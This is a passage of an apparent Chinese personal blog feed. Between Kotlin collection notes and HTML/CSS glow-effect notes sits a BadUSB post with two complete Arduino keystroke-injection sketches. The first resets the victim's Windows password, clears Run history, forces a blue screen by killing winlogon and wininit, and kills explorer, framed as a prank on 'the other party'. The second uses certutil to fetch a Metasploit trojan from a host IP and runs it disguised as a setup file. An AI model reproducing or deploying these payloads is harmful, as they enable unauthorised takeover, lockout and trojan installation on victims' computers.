class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">5</span> <span class="keyword">in</span> longRange) &#123;</span><br><span class="line">    println(<span class="string">&quot;5 in range intRange&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">5</span> !<span class="keyword">in</span> longRange) &#123;</span><br><span class="line">    println(<span class="string">&quot;5 not in range intRange&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>区间的应用</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">val</span> array = intArrayOf(<span class="number">1</span>,<span class="number">3</span>,<span class="number">57</span>,<span class="number">8</span>)</span><br><span class="line"><span class="comment">//遍历数组</span></span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> array.indices) &#123;</span><br><span class="line">        println(array[i])</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><p>kotlin集合框架<br>Ctrl+Shift+A -&gt;show kotlin -&gt;反编译为java   </p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> intList:List&lt;<span class="built_in">Int</span>&gt; = listOf(<span class="number">2</span>,<span class="number">5</span>,<span class="number">3</span>)  <span class="comment">//不可变的list,不能添加或删除元素</span></span><br><span class="line"><span class="keyword">val</span> intList1: MutableList&lt;<span class="built_in">Int</span>&gt; = mutableListOf(<span class="number">4</span>, <span class="number">75</span>, <span class="number">3</span>) <span class="comment">//可变的list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> map: Map&lt;String, Any&gt; = mapOf(<span class="string">&quot;name&quot;</span> to <span class="string">&quot;benny&quot;</span>, <span class="string">&quot;age&quot;</span> to <span class="number">20</span>)  </span><br><span class="line"><span class="comment">//可变,&quot;key&quot; to &quot;value&quot;,Any等价于Java中的Object</span></span><br><span class="line"><span class="keyword">val</span> maop1:Map&lt;String,Any&gt; = mutableMapOf(<span class="string">&quot;name&quot;</span> to <span class="string">&quot;q0o0p&quot;</span>,<span class="string">&quot;age&quot;</span> to <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//集合框架的创建</span></span><br><span class="line"><span class="comment">//java: List&lt;String&gt; stringList=new ArrayList&lt;&gt;();</span></span><br><span class="line"><span class="keyword">val</span> stringlist = ArrayList&lt;String&gt;() </span><br><span class="line"></span><br><span class="line"><span class="comment">//集合框架的修改</span></span><br><span class="line"><span class="keyword">for</span>(i <span class="keyword">in</span> <span class="number">1.</span><span class="number">.10</span>)&#123;</span><br><span class="line">    stringList +=<span class="string">&quot;num:<span class="variable">$i</span>&quot;</span>   <span class="comment">//java: stringList.add(&quot;num:&quot;+i); </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//集合框架的读写</span></span><br><span class="line">stringList[<span class="number">3</span>] = <span class="string">&quot;q0o0p&quot;</span> <span class="comment">//java: stringList.set(3,&quot;q0o0p&quot;);</span></span><br><span class="line"><span class="keyword">val</span> valueAt3 = stringList[<span class="number">3</span>]  <span class="comment">//java: String valueAt3 = stringList.get(3);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//java: HashMap&lt;String,Integer&gt; map1 = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="keyword">val</span> map1 = HashMap&lt;String, <span class="built_in">Int</span>&gt;()  </span><br><span class="line"><span class="comment">//java: map.put(&quot;q0o0p&quot;,9);</span></span><br><span class="line">map1[<span class="string">&quot;q0o0p&quot;</span>]= <span class="number">9</span></span><br><span class="line">println(map1[<span class="string">&quot;q0o0p&quot;</span>])  <span class="comment">//q0o0p -&gt;key</span></span><br></pre></td></tr></table></figure><p>kotlin 新增Pair</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> pair = <span class="string">&quot;q0o0p&quot;</span> to <span class="string">&quot;like&quot;</span></span><br><span class="line"><span class="keyword">val</span> pair1 = Pair(<span class="string">&quot;wow&quot;</span>,<span class="string">&quot;interested&quot;</span>)</span><br><span class="line"><span class="keyword">val</span> first = pair.first</span><br><span class="line"><span class="keyword">val</span> second = pair.second</span><br><span class="line"><span class="keyword">val</span> (x,y) = pair <span class="comment">//解构</span></span><br></pre></td></tr></table></figure><p>kotlin 三个元素-&gt;Tripe</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> triple =  Triple(<span class="string">&quot;q0o0p&quot;</span>,<span class="number">88</span>,<span class="number">6.6</span>)</span><br><span class="line"><span class="keyword">val</span>  first = triple.first</span><br><span class="line"><span class="keyword">val</span> second = triple.second</span><br><span class="line"><span class="keyword">val</span> third = triple.third</span><br><span class="line"><span class="keyword">val</span>(x,y,z) = triple</span><br></pre></td></tr></table></figure><h2 id="函数的类型"><a href="#函数的类型" class="headerlink" title="函数的类型"></a>函数的类型</h2><p>函数的引用 </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>badusb</title>
      <link href="/2020/11/08/badusb/"/>
      <url>/2020/11/08/badusb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>硬件直接插入对方电脑，让对方电脑执行代码，达到干扰、控制主机或者窃取信息等目的。  </p><hr><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>HID是Human Interface Device的缩写，由其名称可以了解HID设备是直接与人交互的设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。简而言之，今天要介绍的Badusb利用的是虚拟键盘来实现恶意代码的执行。</p><p>Bad-Usb插入后，会模拟键盘对电脑进行操作，通过这些操作打开电脑的命令终端，并执行一条命令，这条命令将从指定网址下载恶意代码(通常为powershell脚本)并于后台静默运行。这些代码功能包括：窃取信息、反弹shell、发送邮件等，从而实现控制目标机或者窃取信息的目的。</p><hr><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="digispark"><a href="#digispark" class="headerlink" title="digispark"></a>digispark</h3><p>能够制作BadUSB的几种常见载体有：leonardo_Arduino、Phison、Teensy、Attiny85、PS2303（芯片）、Rubber_Ducky等<br>leonardo_Arduino制作BadUSB的效果最好，使用起来也较为方便。<br>Digispark<br>只需要几块钱就能买到的BadUSB——Digispark，淘宝搜索Digispark即可。</p><p>在双十一终于等到了我的Digispark</p><h3 id="Arduino"><a href="#Arduino" class="headerlink" title="Arduino"></a>Arduino</h3><ul><li>开始安装IDE<br>一个Arduino中文社区的下载地址：<a href="https://www.arduino.cn/thread-5838-1-1.html">https://www.arduino.cn/thread-5838-1-1.html</a><br>配置:<br>文件-&gt;首选项-&gt;附加开发板管理器网址内填入并点击确定<br><a href="http://digistump.com/package_digistump_index.json">http://digistump.com/package_digistump_index.json</a><br><img src="1.png"></li><li>在Arduino中添加Digispark的支持<br>工具-&gt;开发板-&gt;开发板管理器-&gt;Digistump AVR Boards</li></ul><p>打开上面的链接,下载<a href="https://github.com/digistump/DigistumpArduino/releases">Digistump.Drivers</a><br><img src="2.png"><br>安装驱动:<br><img src="3.png"><br><img src="4.png"><br><img src="5.png"></p><p>先把对方开机密码先改了，然后在用各种颜色刷遍命令行，给对方一种美的享受，最后再开开心心的关掉对方桌面进程，当然能蓝屏的还是先蓝屏比较好。<br>代码:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;Keyboard.h&gt;</span></span><br><span class="line">void <span class="function"><span class="title">setup</span></span>() &#123;//初始化</span><br><span class="line"> Keyboard.begin();//开始键盘通讯</span><br><span class="line"> delay(5000);//延时</span><br><span class="line"> Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题</span><br><span class="line"> Keyboard.release(KEY_CAPS_LOCK); //释放大写键</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.press(KEY_LEFT_GUI);//win键</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.press(<span class="string">&#x27;r&#x27;</span>);//r键</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line"> Keyboard.release(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;CMD.EXE /C REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&amp;NET USER %USERNAME% HACKED&quot;</span>);//修改密码HACKED</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;color a&quot;</span>);//更改命令行颜色（绿色）</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;echo ........................................................ &gt;&gt; hacked.txt&quot;</span>);//向hacked.txt写内容</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;echo ## ## ### ###### ## ## ######## ######## &gt;&gt; hacked.txt&quot;</span>);//向hacked.txt写内容</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;color 0&quot;</span>);//更改命令行颜色（绿色）</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;echo ## ## ## ## ## ## ## ## ## ## ## &gt;&gt; hacked.txt&quot;</span>);//向hacked.txt写内容</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;color 1&quot;</span>);//更改命令行颜色（绿色）</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;echo ## ## ## ## ## ## ## ## ## ## &gt;&gt; hacked.txt&quot;</span>);//向hacked.txt写内容</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;color 2&quot;</span>);//更改命令行颜色（绿色）</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;echo ######### ## ## ## ##### ###### ## ## &gt;&gt; hacked.txt&quot;</span>);//向hacked.txt写内容</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;color 3&quot;</span>);//更改命令行颜色（绿色）</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;echo ## ## ######### ## ## ## ## ## ## &gt;&gt; hacked.txt&quot;</span>);//向hacked.txt写内容</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;color 4&quot;</span>);//更改命令行颜色（绿色）</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;echo ## ## ## ## ## ## ## ## ## ## ## &gt;&gt; hacked.txt&quot;</span>);//向hacked.txt写内容</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;color 5&quot;</span>);//更改命令行颜色（绿色）</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;echo ## ## ## ## ###### ## ## ######## ######## &gt;&gt; hacked.txt&quot;</span>);//向hacked.txt写内容</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;color 6&quot;</span>);//更改命令行颜色（绿色）</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;echo ........................................................ &gt;&gt; hacked.txt&quot;</span>);//向hacked.txt写内容</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;color c&quot;</span>);//更改命令行颜色（红色）</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;cls&quot;</span>);//更改命令行颜色（红色）</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;type hacked.txt&quot;</span>);//将hacked.txt文件内容打印在cmd</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;CMD /C START /MIN CMD /C REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&amp;CMD /C START /MIN CMD /C NTSD -C Q -PN WINLOGON.EXE 1&gt;NUL 2&gt;NUL&amp;TASKKILL /F /IM WININIT.EXE 2&gt;NUL&quot;</span>);//蓝屏XP、7</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;taskkill /f /im explorer.exe&quot;</span>);//删除桌面进程(all)</span><br><span class="line"> delay(200);</span><br><span class="line"> Keyboard.end();//结束键盘通讯</span><br><span class="line">&#125;</span><br><span class="line">void loop()//循环</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链接服务器msf木马下载版代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;Keyboard.h&gt;</span></span><br><span class="line">void <span class="function"><span class="title">setup</span></span>()</span><br><span class="line">&#123;</span><br><span class="line"> Keyboard.begin();//开始键盘通信</span><br><span class="line"> delay(4000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样</span><br><span class="line"> Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题</span><br><span class="line"> Keyboard.release(KEY_CAPS_LOCK); //释放大写键</span><br><span class="line"> delay(500);</span><br><span class="line"> Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键</span><br><span class="line"> delay(500);</span><br><span class="line"> Keyboard.press(<span class="string">&#x27;r&#x27;</span>);//按下r键</span><br><span class="line"> delay(500);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"> delay(1000);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;certutil -urlcache -split -f http://192.168.43.242/wwy.exe D:\\setup_11.5.0.exe&quot;</span>);</span><br><span class="line"> delay(1000);</span><br><span class="line"> delay(1000);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;D:\\SETUP_11.5.0.EXE&quot;</span>);</span><br><span class="line"> delay(500);</span><br><span class="line"> Keyboard.println(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line"> delay(500);</span><br><span class="line"> Keyboard.press(KEY_CAPS_LOCK); //按下大写键</span><br><span class="line"> Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键</span><br><span class="line"> delay(400);</span><br><span class="line"> Keyboard.end();//结束键盘通讯</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void <span class="function"><span class="title">loop</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>参考:<br><a href="https://blog.csdn.net/Guapichen/article/details/108122785?utm_medium=distribute.pc_relevant.none-task-blog-title-7&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/Guapichen/article/details/108122785?utm_medium=distribute.pc_relevant.none-task-blog-title-7&amp;spm=1001.2101.3001.4242</a><br><a href="https://blog.csdn.net/weixin_44151971/article/details/85063030?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">https://blog.csdn.net/weixin_44151971/article/details/85063030?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param</a><br><a href="https://cloud.tencent.com/developer/article/1480567">https://cloud.tencent.com/developer/article/1480567</a></p><hr><p>无线鼠标:<br><a href="https://www.freebuf.com/geek/192670.html">https://www.freebuf.com/geek/192670.html</a><br><a href="https://www.freebuf.com/geek/140837.html">https://www.freebuf.com/geek/140837.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>html-css-js</title>
      <link href="/2020/10/10/html-css-js/"/>
      <url>/2020/10/10/html-css-js/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近写动态网站的大作业-_- 头疼<br>前端标签和属性太多,水一篇记录一下常用属性<br>写的原因还是因为健忘</p><p>常用的修改超链接属性</p><ul><li><p><a>标签</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>&#123;<span class="attribute">text-decoration</span>: none;  &#125;  //除掉超链接的下划线</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">color</span>: <span class="number">#316e86</span>;&#125;  //鼠标移动到超链接上的颜色</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span>&#123;<span class="attribute">color</span>: &#125;  //未访问的超链接</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span>&#123;<span class="attribute">color</span>: &#125;  //鼠标点击时的颜色</span><br></pre></td></tr></table></figure></li><li><p>对其方式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">margin</span>: auto;  //元素居中</span><br><span class="line">    <span class="attribute">text-align</span>: center;  //文本居中</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0px</span>;  //右对齐</span><br><span class="line">    <span class="attribute">float</span>: right; //右对齐</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>字体发光特效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">text-shadow: h-shadow v-shadow blur color;</span><br><span class="line">h-shadow    水平阴影的位置（阴影水平偏移量），可为负值，必需</span><br><span class="line">v-shadow    垂直阴影的位置（阴影垂直偏移量），可为负值，必需</span><br><span class="line">blur    阴影模糊的距离（默认为0），可选</span><br><span class="line">color   阴影颜色（默认为当前字体颜色），可选</span><br><span class="line"></span><br><span class="line">text-shadow: 0 0 10px <span class="comment">#e1f8fa,0 0 20px #e1f8fa,0 0 30px #e1f8fa,0 0 40px #e1f8fa;   //设置发光效果</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例如:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>q0o0p<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css"><span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="css">    <span class="attribute">background</span>: <span class="number">#000</span>;</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="css">    <span class="attribute">width</span>: <span class="number">600px</span>;</span></span><br><span class="line"><span class="css">    <span class="attribute">margin</span>: <span class="number">100px</span> auto <span class="number">0</span>;</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="css">    <span class="attribute">font-family</span>: <span class="string">&#x27;Audiowide&#x27;</span>;</span></span><br><span class="line"><span class="css">    <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="css">    <span class="attribute">color</span>: <span class="number">#00a67c</span>;</span></span><br><span class="line"><span class="css">    <span class="attribute">font-size</span>: <span class="number">7em</span>;</span></span><br><span class="line"><span class="css">    -webkit-<span class="attribute">transition</span>: all <span class="number">1.5s</span> ease;</span></span><br><span class="line"><span class="css">            <span class="attribute">transition</span>: all <span class="number">1.5s</span> ease;</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-tag">p</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="css">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="css">    -webkit-<span class="attribute">animation</span>: Glow <span class="number">1.5s</span> ease infinite alternate;</span></span><br><span class="line"><span class="css">            <span class="attribute">animation</span>: Glow <span class="number">1.5s</span> ease infinite alternate;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css"><span class="keyword">@-webkit-keyframes</span> Glow &#123;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">from</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">text-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="number">#fff</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> <span class="number">#fff</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">30px</span> <span class="number">#fff</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">40px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">70px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">80px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">100px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">150px</span> <span class="number">#00a67c</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">to</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">text-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="number">#fff</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="number">#fff</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span> <span class="number">#fff</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">35px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">40px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">50px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">75px</span> <span class="number">#00a67c</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css"><span class="keyword">@keyframes</span> Glow &#123;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">from</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">text-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="number">#fff</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> <span class="number">#fff</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">30px</span> <span class="number">#fff</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">40px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">70px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">80px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">100px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">150px</span> <span 